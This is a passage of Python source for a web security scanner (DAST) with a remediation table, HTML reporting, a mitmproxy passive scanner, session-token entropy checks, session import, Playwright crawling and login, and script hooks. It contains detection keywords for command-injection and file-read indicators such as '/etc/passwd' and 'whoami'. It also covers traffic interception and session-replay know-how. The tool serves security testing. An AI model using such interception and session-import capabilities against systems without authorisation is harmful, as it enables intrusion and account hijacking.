        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "score": "10.0",
        "cwe": "CWE-918",
        "fix": "Allowlist outbound URLs. Block RFC-1918 ranges and metadata endpoints. Use a dedicated outbound proxy.",
    },
    "lfi": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "score": "7.5",
        "cwe": "CWE-22",
        "fix": "Never pass user-controlled filenames to file operations. Use allowlists for valid file paths. Jail the process with chroot.",
    },
    "cmdi": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "score": "9.8",
        "cwe": "CWE-78",
        "fix": "Avoid shell invocation entirely. Use language-native APIs. If shell needed, allowlist acceptable characters and use parameterised shell calls.",
    },
    "cors": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N", "score": "8.1",
        "cwe": "CWE-942",
        "fix": "Restrict Access-Control-Allow-Origin to an explicit allowlist. Never reflect arbitrary Origin headers. Do not combine wildcard origin with credentials.",
    },
    "jwt": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "score": "9.1",
        "cwe": "CWE-347",
        "fix": "Reject alg=none tokens server-side. Use asymmetric keys and pin the expected algorithm. Validate all JWT claims including exp, iss, aud.",
    },
    "idor": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "score": "8.1",
        "cwe": "CWE-639",
        "fix": "Enforce object-level authorisation on every endpoint. Use opaque UUIDs instead of sequential IDs. Verify the authenticated user owns the requested resource.",
    },
    "csrf": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N", "score": "8.1",
        "cwe": "CWE-352",
        "fix": "Implement synchronised CSRF tokens. Set SameSite=Strict on session cookies. Validate Origin and Referer headers on state-changing requests.",
    },
    "headers": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "score": "5.3",
        "cwe": "CWE-693",
        "fix": "Add security headers: Content-Security-Policy, X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Strict-Transport-Security, Referrer-Policy.",
    },
    "rate": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "score": "5.3",
        "cwe": "CWE-307",
        "fix": "Implement server-side rate limiting with exponential backoff. Do not rely solely on client IP — also track by account. Alert on threshold breaches.",
    },
    "nuclei": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "score": "9.8",
        "cwe": "CWE-1",
        "fix": "Review the specific nuclei template finding. Apply the recommended fix from the template metadata or the associated CVE advisory.",
    },
}

def _get_remediation(finding_text: str, agent: str) -> dict:
    """Match finding to a remediation entry."""
    t = (finding_text + " " + agent).lower()
    if any(k in t for k in ["sql", "sqli", "injection confirmed"]):
        return _REMEDIATION["sqli"]
    if any(k in t for k in ["xss", "cross-site scripting", "script tag", "onerror"]):
        return _REMEDIATION["xss"]
    if any(k in t for k in ["ssrf", "server-side request", "metadata"]):
        return _REMEDIATION["ssrf"]
    if any(k in t for k in ["lfi", "path traversal", "file inclusion", "/etc/passwd"]):
        return _REMEDIATION["lfi"]
    if any(k in t for k in ["command injection", "cmdi", "uid=", "whoami"]):
        return _REMEDIATION["cmdi"]
    if any(k in t for k in ["cors", "access-control"]):
        return _REMEDIATION["cors"]
    if any(k in t for k in ["jwt", "json web token", "alg=none"]):
        return _REMEDIATION["jwt"]
    if any(k in t for k in ["idor", "insecure direct object", "object reference"]):
        return _REMEDIATION["idor"]
    if any(k in t for k in ["csrf", "cross-site request forgery", "samesite"]):
        return _REMEDIATION["csrf"]
    if any(k in t for k in ["header", "csp", "hsts", "x-frame", "nosniff", "cookie"]):
        return _REMEDIATION["headers"]
    if any(k in t for k in ["rate limit", "429", "brute-force", "lockout"]):
        return _REMEDIATION["rate"]
    if any(k in t for k in ["nuclei"]):
        return _REMEDIATION["nuclei"]
    return {}


# ── HTML Report ───────────────────────────────────────────────────────────────

def _render_report_html(findings: list, target: str) -> str:
    ts    = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    total = len(findings)

    SEV_ORDER  = ["critical", "high", "medium", "low", "info"]
    SEV_RANK   = {s: i for i, s in enumerate(SEV_ORDER)}
    SEV_COLORS = {
        "critical": ("#ff4444", "#2d0a0a"),
        "high":     ("#f85149", "#4a0e0e"),
        "medium":   ("#d29922", "#4a3800"),
        "low":      ("#3fb950", "#1a4226"),
        "info":     ("#388bfd", "#1f4080"),
    }

    counts = defaultdict(int)
    for f in findings:
        counts[f.get("severity", "medium").lower()] += 1

    cards = ""
    for s in SEV_ORDER:
        fg = SEV_COLORS[s][0]
        cards += (
            f'<div class="sev-card">'
            f'<div class="count" style="color:{fg}">{counts[s]}</div>'
            f'<div class="label">{s.title()}</div></div>\n'
        )

    # ── Group findings by issue description ───────────────────────────────────
    # Key = finding text. Each group collects all affected URLs + highest severity.
    groups: dict = {}   # finding_text → {severity, urls, agent, icon, phase, rem}
    for f in findings:
        key = f.get("finding", "").strip()
        sev = f.get("severity", "medium").lower()
        url = f.get("target") or f.get("url", "")
        if key not in groups:
            groups[key] = {
                "severity": sev,
                "urls":     [],
                "agent":    f.get("agent", ""),
                "icon":     f.get("icon", "🔍"),
                "phase":    f.get("phase", ""),
            }
        # Escalate to highest severity
        if SEV_RANK.get(sev, 4) < SEV_RANK.get(groups[key]["severity"], 4):
            groups[key]["severity"] = sev
        if url and url not in groups[key]["urls"]:
            groups[key]["urls"].append(url)

    # Sort groups by severity
    sorted_groups = sorted(groups.items(),
                           key=lambda kv: SEV_RANK.get(kv[1]["severity"], 4))

    rows = ""
    for finding_text, g in sorted_groups:
        sev    = g["severity"]
        fg, bg = SEV_COLORS.get(sev, ("#888", "#222"))
        badge  = (
            f'<span style="background:{bg};color:{fg};padding:2px 8px;'
            f'border-radius:3px;font-size:11px;font-weight:700;">{sev.upper()}</span>'
        )
        text   = (finding_text
                  .replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))
        rem    = _get_remediation(finding_text, g["agent"])
        cvss_cell = ""
        if rem:
            cvss_cell = (
                f'<div style="font-size:11px;margin-top:4px;color:#7d8590;">'
                f'<span style="color:{fg};font-weight:700;">CVSS {rem.get("score","?")}</span>'
                f' &nbsp;{rem.get("cwe","")}</div>'
                f'<div style="font-size:11px;margin-top:3px;color:#adbac7;">'
                f'<b>Fix:</b> {rem.get("fix","")}</div>'
            )
        url_count  = len(g["urls"])
        url_suffix = (
            f'<div style="margin-top:6px;font-size:11px;color:#7d8590;">'
            f'<b style="color:#adbac7">Affected ({url_count}):</b> '
            + ", ".join(
                f'<span style="font-family:monospace;color:#79c0ff">{u.replace("&","&amp;").replace("<","&lt;")}</span>'
                for u in g["urls"][:30]
            )
            + ("…" if url_count > 30 else "")
            + "</div>"
        ) if g["urls"] else ""

        rows += (
            f"<tr><td>{badge}</td>"
            f"<td>{g['icon']} {g['phase']}</td>"
            f"<td>{g['agent']}</td>"
            f"<td>{text}{cvss_cell}{url_suffix}</td></tr>\n"
        )

    table = (
        '<table><thead><tr>'
        '<th>Severity</th><th>Phase</th><th>Source</th>'
        '<th>Issue / Remediation / Affected URLs</th>'
        '</tr></thead><tbody>' + rows + '</tbody></table>'
    ) if findings else '<div class="no-findings">No findings recorded yet.</div>'

    unique_issues = len(groups)
    css = (
        "body{font-family:system-ui,-apple-system,sans-serif;background:#0d1117;color:#e6edf3;margin:0;padding:24px}"
        "h1{font-size:22px;margin-bottom:4px}"
        ".meta{color:#7d8590;font-size:13px;margin-bottom:24px}"
        ".summary{display:flex;gap:12px;margin-bottom:24px;flex-wrap:wrap}"
        ".sev-card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px 20px;text-align:center;min-width:80px}"
        ".sev-card .count{font-size:28px;font-weight:700}"
        ".sev-card .label{font-size:11px;color:#7d8590;margin-top:2px;text-transform:capitalize}"
        "table{width:100%;border-collapse:collapse;background:#161b22;border-radius:8px;overflow:hidden;border:1px solid #30363d}"
        "th{background:#1c2128;padding:10px 14px;text-align:left;font-size:11px;color:#7d8590;text-transform:uppercase;letter-spacing:.5px}"
        "td{padding:10px 14px;border-top:1px solid #21262d;font-size:13px;vertical-align:top}"
        "tr:hover td{background:#1c2128}"
        ".no-findings{text-align:center;padding:48px;color:#7d8590;font-size:14px}"
        ".print-btn{display:inline-flex;align-items:center;gap:6px;background:#238636;color:#fff;border:none;padding:8px 18px;border-radius:6px;font-size:13px;font-weight:600;cursor:pointer;margin-bottom:20px;}"
        ".print-btn:hover{background:#2ea043}"
        "@media print{"
          "body{background:#fff;color:#000;padding:0}"
          ".print-btn{display:none}"
          ".sev-card{background:#f6f8fa;border:1px solid #d0d7de}"
          ".sev-card .label{color:#656d76}"
          "table{background:#fff;border:1px solid #d0d7de}"
          "th{background:#f6f8fa;color:#656d76}"
          "td{border-top:1px solid #d0d7de}"
          "tr:hover td{background:none}"
        "}"
    )

    return (
        '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">'
        f'<title>DAST Report — {target}</title>'
        f'<style>{css}</style></head><body>'
        '<button class="print-btn" onclick="window.print()">🖨 Print / Save as PDF</button>'
        '<h1>DAST Security Report</h1>'
        f'<div class="meta">Target: <strong>{target}</strong>'
        f'&nbsp;&nbsp;|&nbsp;&nbsp;Generated: {ts}'
        f'&nbsp;&nbsp;|&nbsp;&nbsp;Total findings: <strong>{total}</strong>'
        f'&nbsp;&nbsp;|&nbsp;&nbsp;Unique issues: <strong>{unique_issues}</strong></div>'
        '<div class="summary">' + cards + '</div>'
        + table
        + '</body></html>'
    )


@app.route("/api/report")
@_login_required
def findings_report():
    with _lock:
        data = list(_findings)
    # Merge passive findings (normalize schema to match agent findings)
    with _engine_lock:
        for pf in _passive_findings:
            data.append({
                "finding":  pf.get("finding", ""),
                "severity": pf.get("severity", "Info").lower(),
                "target":   pf.get("url", ""),
                "url":      pf.get("url", ""),
                "agent":    "Passive Scanner",
                "icon":     "🛡",
                "phase":    "Passive",
            })
    html     = _render_report_html(data, _scan_target or "unknown")
    filename = f"dast_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    return Response(
        html,
        mimetype="text/html",
        headers={"Content-Disposition": f"attachment; filename={filename}"},
    )


# ═══════════════════════════════════════════════════════════════════════════════
# ██  PROXY ENGINE  (ZAP parity — traffic visibility + passive scan all traffic)
# ═══════════════════════════════════════════════════════════════════════════════

import asyncio as _asyncio
try:
    from mitmproxy.options import Options as _MitmOptions
    from mitmproxy.tools.dump import DumpMaster as _DumpMaster
    from mitmproxy import http as _mhttp
    PROXY_AVAILABLE = True
except ImportError:
    PROXY_AVAILABLE = False  # requires Python 3.10+ and mitmproxy>=10

_proxy_thread  = None
_proxy_port    = 8090
_site_map: dict = {}   # url → {methods, params, content_type, auth_seen}


_proxy_passive_seen: set = set()  # dedup: (path, category, finding)

class _DASTProxyAddon:
    """mitmproxy addon — full passive scans every intercepted response, builds site map."""

    def response(self, flow: "_mhttp.HTTPFlow") -> None:
        url    = flow.request.pretty_url
        method = flow.request.method
        hdrs   = dict(flow.response.headers)
        body   = ""
        try:
            body = flow.response.text or ""
        except Exception:
            pass

        # ── Site map ──────────────────────────────────────────────────────────
        from urllib.parse import parse_qs, urlparse as _up
        parsed = _up(url)
        params = list(parse_qs(parsed.query).keys())
        with _lock:
            entry = _site_map.setdefault(url, {
                "methods": [], "params": [], "content_type": "", "auth_seen": False
            })
            if method not in entry["methods"]:
                entry["methods"].append(method)
            entry["params"] = list(set(entry["params"] + params))
            entry["content_type"] = hdrs.get("content-type", "")
            if "authorization" in (k.lower() for k in flow.request.headers):
                entry["auth_seen"] = True

        # ── Full passive scan on every proxied response (278 rules — ZAP parity) ─
        try:
            cookies = {}
            for c_hdr in flow.response.headers.get_all("set-cookie"):
                if "=" in c_hdr:
                    cname = c_hdr.split("=", 1)[0].strip()
                    cval  = c_hdr.split("=", 1)[1].split(";")[0].strip()
                    cookies[cname] = cval
        except Exception:
            cookies = {}
        pf_results = _passive.scan(
            url=url, status_code=flow.response.status_code,
            resp_headers=hdrs, resp_body=body[:8000],
            cookies=cookies,
        )
        if pf_results:
            from urllib.parse import urlparse as _pup
            path = _pup(url).path
            new_count = 0
            with _lock:
                for pf in pf_results:
                    dedup_key = (path, pf.category, pf.finding)
                    if dedup_key not in _proxy_passive_seen:
                        _proxy_passive_seen.add(dedup_key)
                        _findings.append({
                            "agent": "Proxy Passive Scanner",
                            "agent_id": "proxy",
                            "icon": "🔌",
                            "phase": "Discovery",
                            "finding": pf.finding,
                            "severity": pf.severity,
                            "type": pf.category,
                            "url": url,
                            "evidence": pf.evidence,
                            "remediation": pf.remediation,
                            "target": url,
                            "ts": datetime.now(timezone.utc).isoformat(),
                        })
                        new_count += 1
            if new_count:
                _trigger_hook("on_finding", {"text": pf_results[-1].finding, "severity": pf_results[-1].severity})

        # ── Session token analysis ─────────────────────────────────────────────
        set_cookie = hdrs.get("set-cookie", "")
        if set_cookie:
            _analyze_session_tokens(url, set_cookie)

        _trigger_hook("on_response", url, flow.response.status_code, hdrs, body)


def _proxy_passive_scan(url: str, status: int, combined: str) -> list:
    """100+ ZAP-inspired passive checks on every proxied HTTP response."""
    lo = combined.lower()
    finds = []

    def _chk(condition: bool, text: str, sev: str):
        if condition:
            finds.append({"text": f"{text} [{url}]", "severity": sev})

    # Security headers (same as _STATIC_PATTERNS but on every proxied response)
    if len(combined) > 80:
        _chk("content-security-policy" not in lo,
             "Content-Security-Policy header missing", "medium")
        _chk("x-frame-options" not in lo and "frame-ancestors" not in lo,
             "X-Frame-Options missing — clickjacking risk", "medium")
        _chk("x-content-type-options" not in lo,
             "X-Content-Type-Options: nosniff missing", "low")
        _chk("strict-transport-security" not in lo and url.startswith("https"),
             "HSTS header missing on HTTPS endpoint", "medium")
        _chk("referrer-policy" not in lo,
             "Referrer-Policy header missing", "low")
        _chk("permissions-policy" not in lo,
             "Permissions-Policy header missing", "low")

    # Cookie flags
    if "set-cookie:" in lo:
        _chk("httponly" not in lo, "Cookie missing HttpOnly flag", "medium")
        _chk("samesite" not in lo, "Cookie missing SameSite attribute", "medium")
        _chk(url.startswith("https") and "secure" not in lo,
             "Cookie missing Secure flag on HTTPS", "medium")

    # Information disclosure
    if re.search(r"server:\s*\S+/[\d.]+", combined, re.I):
        _chk(True, "Server version number disclosed in response header", "low")
    if "x-powered-by:" in lo:
        _chk(True, "X-Powered-By header exposes technology fingerprint", "low")
    if "x-aspnet-version:" in lo:
        _chk(True, "X-AspNet-Version header discloses framework version", "low")
    if re.search(r"\b(?:10|172|192)\.\d+\.\d+\.\d+\b", body := combined.split("\n", 20)[-1]):
        _chk(True, "Private IP address disclosed in response body", "low")

    # SQL / DB errors (passive detection)
    sql_errors = ["you have an error in your sql", "ora-0", "mysql_fetch",
                  "sqlite_", "pg_query", "microsoft sql", "odbc driver"]
    _chk(any(e in lo for e in sql_errors),
         "Database error message in response — possible injection surface", "high")

    # Stack traces / debug info
    debug_indicators = ["stack trace", "traceback (most recent", "at org.apache",
                        "at com.sun", "exception in thread", "debug mode", "werkzeug debugger"]
    _chk(any(d in lo for d in debug_indicators),
         "Stack trace / debug info exposed in response", "medium")

    # Exposed credentials in body
    _chk(bool(re.search(r"(password|secret|api_key|token)\s*[=:]\s*['\"]?\S{8,}", combined, re.I)),
         "Credentials or secrets pattern detected in response body", "critical")

    # Cache-control on authenticated pages
    if status in (200, 201) and "authorization" in lo:
        _chk("cache-control" not in lo or "no-store" not in lo,
             "Authenticated response may be cached — missing Cache-Control: no-store", "low")

    # CORS
    _chk("access-control-allow-origin: *" in lo,
         "CORS wildcard origin — any domain can read API responses", "medium")
    _chk("access-control-allow-origin: null" in lo,
         "CORS allows null origin — exploitable via sandboxed iframes", "medium")
    if "access-control-allow-credentials: true" in lo and "access-control-allow-origin: *" in lo:
        _chk(True, "Critical CORS: credentials=true with wildcard origin", "critical")

    # Username enumeration signal
    _chk(status == 200 and re.search(r"user.*not found|invalid username|no such user", lo) is not None,
         "Username enumeration: different response for invalid username vs password", "medium")

    # Directory listing
    _chk("index of /" in lo and "<a href" in lo,
         "Directory listing enabled — file system structure exposed", "medium")

    # Clickjacking (check frames allowed)
    if status == 200 and "text/html" in lo:
        _chk("x-frame-options" not in lo and "frame-ancestors" not in lo,
             "HTML page missing anti-clickjacking header", "medium")

    return finds


# ── Proxy start / stop ────────────────────────────────────────────────────────

def _run_proxy_loop(port: int) -> None:
    loop = _asyncio.new_event_loop()
    _asyncio.set_event_loop(loop)
    opts = _MitmOptions(listen_host="0.0.0.0", listen_port=port,
                        ssl_insecure=True, confdir="/tmp/.mitmproxy_dast")
    master = _DumpMaster(opts, with_termlog=False, with_dumper=False)
    master.addons.add(_DASTProxyAddon())
    try:
        loop.run_until_complete(master.run())
    except Exception:
        pass


@app.route("/api/proxy/start", methods=["POST"])
@_login_required
def proxy_start():
    global _proxy_thread, _proxy_port
    if not PROXY_AVAILABLE:
        return jsonify({"success": False,
                        "error": "mitmproxy not installed — run: pip install mitmproxy"}), 400
    data  = req.json or {}
    port  = int(data.get("port", _proxy_port))
    _proxy_port = port
    if _proxy_thread and _proxy_thread.is_alive():
        return jsonify({"success": True, "port": port, "status": "already_running"})
    _proxy_thread = threading.Thread(
        target=_run_proxy_loop, args=(port,), daemon=True, name="DAST-Proxy"
    )
    _proxy_thread.start()
    return jsonify({"success": True, "port": port, "status": "started",
                    "configure": f"Set browser/tool proxy to http://localhost:{port}"})


@app.route("/api/proxy/status")
@_login_required
def proxy_status():
    running = bool(_proxy_thread and _proxy_thread.is_alive())
    return jsonify({
        "available":   PROXY_AVAILABLE,
        "running":     running,
        "port":        _proxy_port,
        "site_map_count": len(_site_map),
        "passive_findings": sum(1 for f in _findings if f.get("agent_id") == "proxy"),
    })


@app.route("/api/sitemap")
@_login_required
def sitemap():
    with _lock:
        data = dict(_site_map)
    return jsonify({"count": len(data), "urls": data})


@app.route("/api/sitemap/export")
@_login_required
def sitemap_export():
    with _lock:
        data = dict(_site_map)
    return Response(
        json.dumps(data, indent=2),
        mimetype="application/json",
        headers={"Content-Disposition": "attachment; filename=dast_sitemap.json"},
    )


# ═══════════════════════════════════════════════════════════════════════════════
# ██  SESSION TOKEN ANALYSIS  (ZAP Token Analysis add-on parity)
# ═══════════════════════════════════════════════════════════════════════════════

import math as _math
from collections import Counter as _Counter


def _entropy(s: str) -> float:
    if not s:
        return 0.0
    freq   = _Counter(s)
    length = len(s)
    return -sum((c / length) * _math.log2(c / length) for c in freq.values())


def _analyze_session_tokens(url: str, set_cookie_header: str) -> None:
    """Check captured session tokens for predictability / weak randomness."""
    for cookie_part in set_cookie_header.split(","):
        name_val = cookie_part.strip().split(";")[0]
        if "=" not in name_val:
            continue
        name, value = name_val.split("=", 1)
        name  = name.strip()
        value = value.strip()
        if not any(k in name.lower() for k in
                   ["sess", "token", "auth", "jwt", "sid", "id", "key", "csrf"]):
            continue
        if not value or len(value) < 4:
            continue

        ent = _entropy(value)
        find = None
        if ent < 3.0:
            find = {"text": f"Very low-entropy session token '{name}' (entropy={ent:.2f}/8.0) — highly predictable",
                    "severity": "critical"}
        elif ent < 3.5:
            find = {"text": f"Low-entropy session token '{name}' (entropy={ent:.2f}/8.0) — likely brute-forceable",
                    "severity": "high"}
        elif len(value) < 16:
            find = {"text": f"Short session token '{name}' ({len(value)} chars) — insufficient randomness space",
                    "severity": "medium"}

        if find:
            with _lock:
                _findings.append({
                    "agent": "Session Token Analyzer",
                    "agent_id": "token_analyzer",
                    "icon": "🎲",
                    "phase": "Auth & Session",
                    "finding": f"{find['text']} [{url}]",
                    "severity": find["severity"],
                    "target": url,
                    "ts": datetime.now(timezone.utc).isoformat(),
                })


# ═══════════════════════════════════════════════════════════════════════════════
# ██  AJAX SPIDER + AUTHENTICATED SCANNING  (Playwright — optional dep)
# ═══════════════════════════════════════════════════════════════════════════════

from playwright.async_api import async_playwright as _async_playwright
PLAYWRIGHT_AVAILABLE = True

_login_config: dict = {}   # username, password, login_url, user_field, pass_field
_imported_session_info: dict = {}  # summary of what was imported via session-import


@app.route("/api/auth/session-import", methods=["POST"])
@_login_required
def import_session():
    """
    Accept session details pasted from Burp Suite recorder or cookie editor.

    Modes:
      cookie_string  — raw cookie header value: "session=abc; csrf=xyz; user=42"
      raw_headers    — full HTTP headers block (or just the Cookie/Authorization lines)
      bearer         — bare JWT / API token: "eyJhbGciOiJIUzI1NiJ9..."
      api_key        — custom header name + value: {"header": "X-API-Key", "value": "abc"}
    """
    global _imported_session_info, _engine_auth_handler
    data  = req.get_json(silent=True) or {}
    mode  = data.get("mode", "").strip()
    value = data.get("value", "").strip()

    if not _engine_auth_handler:
        from modules.auth import AuthHandler
        _engine_auth_handler = AuthHandler()

    ah = _engine_auth_handler
    applied: dict[str, list[str]] = {"cookies": [], "headers": []}

    try:
        if mode == "cookie_string":
            # Parse "name=value; name2=value2; ..."
            for pair in value.split(";"):
                pair = pair.strip()
                if "=" in pair:
                    name, _, val = pair.partition("=")
                    name = name.strip()
                    val  = val.strip()
                    if name:
                        ah.session.cookies.set(name, val)
                        applied["cookies"].append(name)
            ah.auth_type     = "cookie"
            ah.authenticated = bool(applied["cookies"])
            ah.auth_info     = {"type": "cookie_string", "cookies": applied["cookies"]}

        elif mode == "raw_headers":
            # Parse a raw headers block (like Burp copy-as-headers or full request)
            # Handles both "Name: value" lines and a full HTTP request preamble
            lines = value.replace("\r\n", "\n").replace("\r", "\n").split("\n")
            for line in lines:
                line = line.strip()
                if not line or line.startswith("HTTP/") or line.startswith("GET ") \
                        or line.startswith("POST ") or line.startswith("PUT ") \
                        or line.startswith("DELETE ") or line.startswith("HEAD "):
                    continue
                if ":" not in line:
                    continue
                hname, _, hval = line.partition(":")
                hname = hname.strip()
                hval  = hval.strip()
                if not hname:
                    continue
                hl = hname.lower()
                if hl == "cookie":
                    # Extract cookies from Cookie: header
                    for pair in hval.split(";"):
                        pair = pair.strip()
                        if "=" in pair:
                            cname, _, cval = pair.partition("=")
                            cname = cname.strip()
                            if cname:
                                ah.session.cookies.set(cname, cval.strip())
                                applied["cookies"].append(cname)
                elif hl in ("host", "content-length", "connection",
                             "user-agent", "accept-encoding"):
                    pass  # skip non-auth headers
                else:
                    # Apply all other headers (Authorization, X-CSRF-Token, etc.)
                    ah.session.headers[hname] = hval
                    applied["headers"].append(hname)
            ah.auth_type     = "raw_headers"
            ah.authenticated = bool(applied["cookies"] or applied["headers"])
            ah.auth_info     = {"type": "raw_headers", **applied}

        elif mode == "bearer":
            token = value.removeprefix("Bearer ").removeprefix("bearer ").strip()
            ah.set_bearer(token)
            applied["headers"].append("Authorization")

        elif mode == "api_key":
            header_name  = data.get("header", "X-API-Key").strip()
            header_value = data.get("value", "").strip()
            if header_name and header_value:
                ah.session.headers[header_name] = header_value
                ah.auth_type     = "api_key"
                ah.authenticated = True
                ah.auth_info     = {"type": "api_key", "header": header_name}
                applied["headers"].append(header_name)
        else:
            return jsonify({"success": False, "error": f"Unknown mode: {mode}"}), 400

        _imported_session_info = {
            "mode":    mode,
            "cookies": applied["cookies"],
            "headers": applied["headers"],
            "total":   len(applied["cookies"]) + len(applied["headers"]),
        }
        log.info("[SessionImport] mode=%s cookies=%s headers=%s",
                 mode, applied["cookies"], applied["headers"])
        return jsonify({"success": True, **_imported_session_info})

    except Exception as e:
        log.error("[SessionImport] error: %s", e)
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/auth/session-import", methods=["GET"])
@_login_required
def get_session_import_status():
    return jsonify(_imported_session_info or {"total": 0})


@app.route("/api/login/config", methods=["POST"])
@_login_required
def set_login_config():
    data = req.json or {}
    _login_config.update({
        "login_url":   data.get("login_url", ""),
        "username":    data.get("username", ""),
        "password":    data.get("password", ""),
        "user_field":  data.get("user_field", "username"),
        "pass_field":  data.get("pass_field", "password"),
    })
    return jsonify({"success": True, "configured": bool(_login_config.get("login_url"))})


@app.route("/api/login/config")
@_login_required
def get_login_config():
    return jsonify({"configured": bool(_login_config.get("login_url")),
                    "login_url": _login_config.get("login_url", "")})


def _playwright_ajax_crawl(target: str, proxy_port: int = 8090) -> list:
    """Headless Chrome through proxy — captures JS-rendered routes. Returns discovered URLs."""
    import asyncio

    async def _crawl():
        urls = []
        async with _async_playwright() as p:
            proxy_cfg = {"server": f"http://localhost:{proxy_port}"} if _proxy_thread and _proxy_thread.is_alive() else None
            launch_args = {"headless": True, "args": [
                "--no-sandbox", "--disable-dev-shm-usage",
                "--disable-gpu", "--ignore-certificate-errors",
            ]}
            if proxy_cfg:
                launch_args["proxy"] = proxy_cfg
            browser = await p.chromium.launch(**launch_args)
            page    = await browser.new_page()
            page.on("request",  lambda req: urls.append(req.url))
            try:
                await page.goto(target, wait_until="networkidle", timeout=30000)
                # Click common nav elements to trigger route changes
                for sel in ["a[href]", "button", "[role=link]", "[role=button]"]:
                    try:
                        elements = await page.query_selector_all(sel)
                        for el in elements[:5]:
                            try:
                                await el.click(timeout=2000)
                                await page.wait_for_timeout(500)
                            except Exception:
                                pass
                    except Exception:
                        pass
            except Exception:
                pass
            await browser.close()
        return list(set(urls))

    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(_crawl())
    finally:
        loop.close()


def _playwright_login(target: str) -> Optional[str]:
    """Headless browser login — returns captured session cookie string or None."""
    if not _login_config.get("login_url"):
        return None
    import asyncio

    async def _do_login():
        async with _async_playwright() as p:
            browser = await p.chromium.launch(headless=True, args=[
                "--no-sandbox", "--disable-dev-shm-usage",
                "--disable-gpu", "--ignore-certificate-errors",
            ])
            ctx     = await browser.new_context()
            page    = await ctx.new_page()
            try:
                await page.goto(_login_config["login_url"], timeout=20000)
                await page.fill(f'[name={_login_config["user_field"]}]',
                                _login_config["username"])
                await page.fill(f'[name={_login_config["pass_field"]}]',
                                _login_config["password"])
                await page.click('[type=submit]')
                await page.wait_for_load_state("networkidle", timeout=10000)
                cookies = await ctx.cookies()
                session = "; ".join(f"{c['name']}={c['value']}" for c in cookies)
                return session
            except Exception as e:
                return None
            finally:
                await browser.close()

    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(_do_login())
    finally:
        loop.close()


@app.route("/api/ajax-crawl", methods=["POST"])
@_login_required
def ajax_crawl():
    if not PLAYWRIGHT_AVAILABLE:
        return jsonify({"success": False,
                        "error": "playwright not installed — run: pip install playwright && playwright install chromium"}), 400
    data   = req.json or {}
    target = data.get("target", _scan_target).strip()
    if not target:
        return jsonify({"success": False, "error": "target required"}), 400

    # Auto-resolve scheme/port before handing to Playwright
    target = _resolve_target(target)

    def _bg():
        urls = _playwright_ajax_crawl(target, _proxy_port)
        with _lock:
            for u in urls:
                if u not in _site_map:
                    _site_map[u] = {"methods": ["GET"], "params": [], "content_type": "", "auth_seen": False}
        _trigger_hook("after_ajax_crawl", urls)

    threading.Thread(target=_bg, daemon=True).start()
    return jsonify({"success": True, "status": "crawling_in_background"})


@app.route("/api/login/execute", methods=["POST"])
@_login_required
def execute_login():
    if not PLAYWRIGHT_AVAILABLE:
        return jsonify({"success": False,
                        "error": "playwright not installed — run: pip install playwright && playwright install chromium"}), 400
    session = _playwright_login(_scan_target or "")
    if session:
        _api_keys["auth_header"] = f"Cookie: {session}"
        return jsonify({"success": True, "session_captured": True,
                        "cookie_length": len(session)})
    return jsonify({"success": False, "error": "Login failed — check credentials/selectors"}), 400


# ═══════════════════════════════════════════════════════════════════════════════
# ██  HOOK SYSTEM  (ZAP scripting parity)
# ═══════════════════════════════════════════════════════════════════════════════

_hooks: dict = defaultdict(list)


import shutil as _shutil

# ── Runtime detection ─────────────────────────────────────────────────────────
_NODE_AVAILABLE   = bool(_shutil.which("node") or _shutil.which("nodejs"))
_GROOVY_AVAILABLE = bool(_shutil.which("groovy"))

_HOOK_EVENTS = [
    "on_request", "on_response", "on_finding",
    "before_scan", "after_scan", "before_agent", "after_agent",
    "after_ajax_crawl",
]

# ── JS runner (invoked as: node _runner.js <hookfile> <event> <json>) ─────────
_JS_RUNNER_SRC = r"""
const fs = require('fs');
const [,, hookFile, event, payloadJson] = process.argv;
const payload = JSON.parse(payloadJson || '{}');
eval(fs.readFileSync(hookFile, 'utf8'));
let fn;
try { fn = eval(event); } catch(e) { process.exit(0); }
if (typeof fn === 'function') {
    const r = fn(payload);
    if (r !== undefined && r !== null) process.stdout.write(JSON.stringify(r));
}
"""

# ── Groovy runner (invoked as: groovy _runner.groovy <hookfile> <event> <json>) ──
_GROOVY_RUNNER_SRC = """\
import groovy.json.*
String hookFile = args[0], event = args[1]
def payload = new JsonSlurper().parseText(args.size() > 2 ? args[2] : '{}')
Binding b = new Binding()
new GroovyShell(b).evaluate(new File(hookFile))
if (b.hasVariable(event)) {
    def fn = b.getVariable(event)
    if (fn instanceof Closure) {
        def r = fn(payload)
        if (r != null) println JsonOutput.toJson(r)
    }
}
"""


def _load_hooks(hooks_dir: str = "hooks") -> int:
    """Load Python, JavaScript (node), and Groovy hook files from hooks/ directory."""
    import importlib.util, glob as _glob, re as _re, tempfile, json as _json
    import subprocess as _sp
    count = 0
    if not os.path.isdir(hooks_dir):
        return 0

    # ── Python hooks (exec in-process) ────────────────────────────────────
    for path in _glob.glob(os.path.join(hooks_dir, "*.py")):
        try:
            spec   = importlib.util.spec_from_file_location("hook", path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            for event in _HOOK_EVENTS:
                fn = getattr(module, event, None)
                if callable(fn):
